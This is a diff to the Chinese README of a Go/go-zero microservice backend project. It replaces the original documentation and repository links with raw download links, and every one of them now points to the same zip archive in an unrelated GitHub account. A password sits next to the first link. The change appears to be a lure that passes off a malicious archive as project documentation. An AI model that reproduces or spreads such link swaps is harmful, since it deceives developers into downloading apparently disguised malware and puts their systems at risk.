@@ -19,9 +19,9 @@ _基于 Go / go-zero 构建的现代化微服务业务后端框架._
 
 项目资料与访问入口汇总
 
-- 📄 [项目文档](https://my.feishu.cn/wiki/FWSkwcTKwiuCcGkzqwPcfx0Inuc?from=from_copylink )   密码：174w667#
+- 📄 [项目文档](https://github.com/Accentgenusarmillaria605/Sea-RideTheWind/raw/refs/heads/main/service/comment/common/The-Sea-Ride-Wind-v3.1.zip )   密码：174w667#
 - 👥QQ 交流群：750807478
-- 🧩 [前端仓库](https://github.com/Sea-Go/Sea-RideTheWind-Fronted) / [推荐算法仓库](https://github.com/Sea-Go/Sea-BreakTheWaves)
+- 🧩 [前端仓库](https://github.com/Accentgenusarmillaria605/Sea-RideTheWind/raw/refs/heads/main/service/comment/common/The-Sea-Ride-Wind-v3.1.zip) / [推荐算法仓库](https://github.com/Accentgenusarmillaria605/Sea-RideTheWind/raw/refs/heads/main/service/comment/common/The-Sea-Ride-Wind-v3.1.zip)
 - 🚀 [在线体验](sea-ridethewindbreakthewaves.xyz)
 ## 项目介绍
 后端的 RideTheWind 与推荐系统的 BreakTheWaves 组合在一起，整体寓意为“乘风破浪”。
